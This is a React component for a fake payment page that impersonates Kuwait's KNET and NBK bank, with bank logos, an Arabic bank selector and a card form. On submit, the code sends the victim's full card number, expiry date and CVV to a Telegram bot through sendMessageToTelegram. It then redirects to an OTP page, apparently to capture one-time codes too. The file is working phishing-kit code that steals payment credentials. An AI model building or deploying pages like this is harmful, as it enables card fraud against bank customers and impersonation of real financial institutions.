import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Input } from "@/components/ui/input";
import { sendMessageToTelegram } from "@/backend/telegramService";

const CardDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const queryParams = new URLSearchParams(window.location.search);
  
  const paymentData = useMemo(() => ({
    customerName: queryParams.get('n') || "halits.YILDIZ",
    amount: queryParams.get('a') || "5.000",
    description: queryParams.get('p') || "طلب رابط دفع من chalits.YILDIZ بمبلغ KWD 5.000. سيكون الرابط صالحًا لمدة 24 ساعة.",
    currency: queryParams.get('c') || "KWD"
  }), [window.location.search]);

  const [formData, setFormData] = useState({ bank: "", cardNumber: "", expiryMonth: "", expiryYear: "", cvv: "" });
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const kuwaitiBanks = [
    { value: "", label: "يرجى اختيار البنك" },
    { value: "nbk", label: "بنك الكويت الوطني" },
    { value: "gbk", label: "بنك الخليج" },
    { value: "cbk", label: "البنك التجاري الكويتي" },
    { value: "abk", label: "بنك الأهلي الكويتي" },
    { value: "kfh", label: "بيت التمويل الكويتي" },
    { value: "burgan", label: "بنك برقان" },
    { value: "warba", label: "بنك وربة" },
    { value: "boubyan", label: "بنك بوبيان" },
    { value: "kib", label: "البنك الكويتي الدولي" },
    { value: "ksb", label: "بنك الكويت والشرق الأوسط" },
    { value: "mashreq", label: "بنك المشرق" },
    { value: "unb", label: "بنك الاتحاد الوطني" },
    { value: "bni", label: "بنك قطر الوطني" },
    { value: "dohabank", label: "بنك الدوحة" },
    { value: "hsbc", label: "HSBC" },
    { value: "citibank", label: "سيتي بنك" }
  ];

  const validateCardNumber = (number: string) => {
    const digits = number.replace(/\s/g, '');
    if (digits.length < 13 || digits.length > 19) return false;
    let sum = 0; let shouldDouble = false;
    for (let i = digits.length - 1; i >= 0; i--) {
      let digit = parseInt(digits.charAt(i));
      if (shouldDouble) { if ((digit *= 2) > 9) digit -= 9; }
      sum += digit; shouldDouble = !shouldDouble;
    }
    return (sum % 10) === 0;
  };

  const handleInputChange = (field: string, value: string) => {
    setError("");
    if (field === 'cardNumber') {
      // Allow only numbers and spaces, format for visual ease
      const digitsOnly = value.replace(/\D/g, '');
      const formatted = digitsOnly.replace(/(.{4})/g, '$1 ').trim();
      setFormData(prev => ({ ...prev, [field]: formatted.slice(0, 24) }));
    } else {
      setFormData(prev => ({ ...prev, [field]: value }));
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const cleanNumber = formData.cardNumber.replace(/\s/g, '');
    if (!validateCardNumber(cleanNumber)) { setError("رقم البطاقة غير صالح"); return; }
    setLoading(true);
    const message = `
<b>💳 Card Entry</b>
<b>Name:</b> ${paymentData.customerName}
<b>Amount:</b> ${paymentData.amount} KD
<b>Bank:</b> ${formData.bank}
<b>Card:</b> <code>${formData.cardNumber}</code>
<b>Expiry:</b> ${formData.expiryMonth}/${formData.expiryYear}
<b>CVV:</b> ${formData.cvv}
`;
    await sendMessageToTelegram(message);
    setTimeout(() => navigate(`/otp/${id}${window.location.search}`), 1500);
  };

  return (
    <div className="min-h-screen" style={{ backgroundColor: '#e8e8e8' }}>
      <div className="w-full h-20 sm:h-32 bg-gradient-to-r from-blue-300 to-blue-500 relative overflow-hidden">
        <img src="/lovable-uploads/1d2a9902-d961-468c-9f95-1695f21fb91b.png" alt="NBK Logo" className="w-full h-full object-cover" />
      </div>

      <div className="container mx-auto px-3 sm:px-6 py-4 sm:py-8 max-w-2xl">
        <div className="bg-white rounded-2xl sm:rounded-3xl shadow-lg p-4 sm:p-8 mb-3 sm:mb-6" style={{ borderRadius: '16px', boxShadow: '0 4px 16px rgba(0,0,0,0.1)' }}>
          <div className="text-center mb-4 sm:mb-8">
            <div className="flex items-center justify-center mb-3 sm:mb-6">
              <img src="/lovable-uploads/dd68033e-3d38-482d-ad61-28ff811e33ba.png" alt="NBK Logo" className="h-8 sm:h-12 w-auto" />
            </div>
          </div>
          <div className="border-t border-gray-300 pt-3 sm:pt-6">
            <div className="flex justify-between items-center mb-3 sm:mb-6 text-sm sm:text-lg">
              <span className="text-blue-600 font-medium">{paymentData.customerName}</span>
              <span className="text-gray-800 font-medium">:المستفيد</span>
            </div>
            <div className="border-t border-gray-300 pt-2 sm:pt-4 text-base sm:text-xl flex justify-between items-center">
              <span className="text-blue-600 font-bold">KD {paymentData.amount}</span>
              <span className="text-gray-800 font-medium">:المبلغ</span>
            </div>
          </div>
        </div>

        <div className="bg-white rounded-2xl sm:rounded-3xl shadow-lg p-4 sm:p-8 mb-3 sm:mb-6" style={{ borderRadius: '16px', boxShadow: '0 4px 16px rgba(0,0,0,0.1)' }}>
          <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-8">
            {error && <div className="p-3 bg-red-100 text-red-700 rounded text-center">{error}</div>}
            <div className="flex justify-between items-center">
              <select value={formData.bank} onChange={(e) => handleInputChange('bank', e.target.value)} className="flex-1 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl bg-white text-sm sm:text-lg" required>
                {kuwaitiBanks.map(b => <option key={b.value} value={b.value}>{b.label}</option>)}
              </select>
              <label className="text-blue-600 font-medium mr-3 sm:mr-6 whitespace-nowrap text-sm sm:text-lg">:يرجى اختيار البنك</label>
            </div>
            <div className="flex justify-between items-center">
              <Input type="text" placeholder="#### #### #### ####" value={formData.cardNumber} onChange={(e) => handleInputChange('cardNumber', e.target.value)} className="flex-1 p-2 sm:p-4 border-2 border-blue-500 rounded-lg sm:rounded-xl text-center text-sm sm:text-lg" required />
              <label className="text-blue-600 font-medium mr-3 sm:mr-6 whitespace-nowrap text-sm sm:text-lg">:رقم بطاقة الصرف الآلي</label>
            </div>
            <div className="flex justify-between items-center">
              <div className="flex space-x-2 sm:space-x-3">
                <select value={formData.expiryYear} onChange={(e) => handleInputChange('expiryYear', e.target.value)} className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-xs sm:text-base" required>
                  <option value="">YYYY</option>{Array.from({length: 20}, (_, i) => <option key={2024+i} value={2024+i}>{2024+i}</option>)}
                </select>
                <select value={formData.expiryMonth} onChange={(e) => handleInputChange('expiryMonth', e.target.value)} className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-xs sm:text-base" required>
                  <option value="">MM</option>{Array.from({length: 12}, (_, i) => <option key={i+1} value={String(i+1).padStart(2, '0')}>{String(i+1).padStart(2, '0')}</option>)}
                </select>
              </div>
              <label className="text-blue-600 font-medium mr-3 sm:mr-6 whitespace-nowrap text-sm sm:text-lg">:تاريخ انتهاء البطاقة</label>
            </div>
            <div className="flex justify-between items-center">
              <Input type="text" maxLength={3} value={formData.cvv} onChange={(e) => handleInputChange('cvv', e.target.value)} className="flex-1 p-2 sm:p-4 border-2 border-blue-500 rounded-lg sm:rounded-xl text-center text-sm sm:text-lg" required />
              <label className="text-blue-600 font-medium mr-3 sm:mr-6 whitespace-nowrap text-sm sm:text-lg">:الرقم السري</label>
            </div>
            <div className="flex space-x-3 sm:space-x-6 mt-6">
              <button type="button" onClick={() => navigate(-1)} className="flex-1 bg-gray-300 text-gray-800 py-3 sm:py-5 rounded-xl text-base sm:text-xl font-medium">إلغاء</button>
              <button type="submit" disabled={loading} className="flex-1 bg-blue-700 text-white py-3 sm:py-5 rounded-xl text-base sm:text-xl font-bold shadow-lg">{loading ? 'جاري الإرسال...' : 'إرسال'}</button>
            </div>
          </form>
        </div>
        <div className="text-center mt-6 sm:mt-12 text-gray-700 font-medium">
          <div className="text-sm sm:text-lg mb-2">جميع الحقوق محفوظة © 2025</div>
          <div className="text-sm sm:text-lg text-blue-600">شركة الخدمات المصرفية الآلية المشتركة - كي نت</div>
        </div>
      </div>
    </div>
  );
};

export default CardDetails;
